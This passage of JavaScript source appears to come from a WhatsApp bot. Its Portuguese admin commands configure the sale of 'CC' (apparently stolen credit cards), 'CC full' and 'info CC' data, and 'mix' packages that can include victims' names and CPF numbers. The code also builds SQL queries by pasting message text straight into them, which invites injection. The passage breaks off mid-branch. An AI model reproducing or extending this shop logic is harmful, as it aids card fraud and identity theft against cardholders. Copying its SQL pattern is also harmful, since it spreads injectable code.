        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/mixnomecpf===") > -1 && Adms.includes(Numero)) {
            Array_Total_Igual = Mensagem_Texto.match(/\=/igm);
            msg = Mensagem_Texto.split("===")

            if (msg[1] === "" || Array_Total_Igual.length != 3) {
                Texto = `Comando inválido`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            }

            if (msg[1] === "0") {
                await DataBase_Better.prepare(`UPDATE SISTEMA SET VALOR = '0' WHERE PARAMETRO = 'NOME_CPF_NA_MIX'`).run()
                Texto = `*PACOTES MIX VÃO SEM NOME E CPF*`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            } else if (msg[1] === "1") {
                await DataBase_Better.prepare(`UPDATE SISTEMA SET VALOR = '1' WHERE PARAMETRO = 'NOME_CPF_NA_MIX'`).run()
                Texto = `*PACOTES MIX IRÃO COM NOME E CPF*`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            } else {
                Texto = `Comando inválido.`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            }
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/textomenucc===") > -1 && Adms.includes(Numero)) {
            try {
                msg = Mensagem_Texto.split("===")

                if (msg[1] === "") {
                    Texto = `Comando inválido`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

                }
                TEXTO_MENU_CC = msg[1]
                TEXTO_MENU_CC = TEXTO_MENU_CC.replace(/\'/igm, "")
                await DataBase_Better.prepare(`UPDATE SISTEMA SET VALOR = '${TEXTO_MENU_CC}' WHERE PARAMETRO = 'TEXTO_MENU_CC'`).run()

                Texto = `*TEXTO DO MENU DE CCs ALTERADO COM SUCESSO!*`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            } catch (error) {
                console.log(debugLine(`Erro = ${JSON.stringify(error)} | ${error}`))
                Texto = `Comando inválido`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            }
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/textocomproucc===") > -1 && Adms.includes(Numero)) {
            try {
                msg = Mensagem_Texto.split("===")
                Array_Total_Igual = Mensagem_Texto.match(/\=/igm);

                if (msg[1] === "") {
                    Texto = `Comando inválido`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

                }
                MENSAGEM_AO_COMPRAR_CC = msg[1]
                MENSAGEM_AO_COMPRAR_CC = MENSAGEM_AO_COMPRAR_CC.replace(/\'/igm, "")
                await DataBase_Better.prepare(`UPDATE SISTEMA SET VALOR = '${MENSAGEM_AO_COMPRAR_CC}' WHERE PARAMETRO = 'MENSAGEM_AO_COMPRAR_CC'`).run()

                Texto = `*TEXTO A EXIBIR QUANDO CLIENTE COMPRAR CC, ALTERADO COM SUCESSO!*`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            } catch (error) {
                console.log(debugLine(`Erro = ${JSON.stringify(error)} | ${error}`))
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            }
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/venderunidadecc===") > -1 && Adms.includes(Numero)) {
            Array_Total_Igual = Mensagem_Texto.match(/\=/igm);
            msg = Mensagem_Texto.split("===")

            if (msg[1] === "" || Array_Total_Igual.length != 3) {
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            }

            if (msg[1] === "0") {
                await DataBase_Better.prepare(`UPDATE SISTEMA SET VALOR = '0' WHERE PARAMETRO = 'VENDER_UNIDADE_CC'`).run()
                Texto = `*ESTE BOT NÃO VENDERÁ CC POR UNIDADE.*`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            } else if (msg[1] === "1") {
                await DataBase_Better.prepare(`UPDATE SISTEMA SET VALOR = '1' WHERE PARAMETRO = 'VENDER_UNIDADE_CC'`).run()
                Texto = `*ESTE BOT VENDERÁ CC POR UNIDADE.*`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            } else {
                Texto = `Comando inválido!`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            }
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/venderinfocc===") > -1 && Adms.includes(Numero)) {
            Array_Total_Igual = Mensagem_Texto.match(/\=/igm);
            msg = Mensagem_Texto.split("===")

            if (msg[1] === "" || Array_Total_Igual.length != 3) {
                Texto = `Comando inválido`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            }

            if (msg[1] === "1") {
                await DataBase_Better.prepare(`UPDATE SISTEMA SET VALOR = '1' WHERE PARAMETRO = 'INFOCC_NORMAL'`).run()
                Texto = `*OPÇÃO DE INFO CC HABILITADA!*`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            } else if (msg[1] === "0") {
                await DataBase_Better.prepare(`UPDATE SISTEMA SET VALOR = '0' WHERE PARAMETRO = 'INFOCC_NORMAL'`).run()
                Texto = `*OPÇÃO DE INFO CC DESABILITADA!*`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            } else {
                Texto = `Comando inválido!`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            }
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/venderccfull===") > -1 && Adms.includes(Numero)) {
            Array_Total_Igual = Mensagem_Texto.match(/\=/igm);
            msg = Mensagem_Texto.split("===")

            if (msg[1] === "" || Array_Total_Igual.length != 3) {
                Texto = `Comando inválido`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            }

            if (msg[1] === "1") {
                await DataBase_Better.prepare(`UPDATE SISTEMA SET VALOR = '1' WHERE PARAMETRO = 'FULLDADOS'`).run()
                Texto = `*OPÇÃO DE CC FULL HABILITADA!*`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            } else if (msg[1] === "0") {
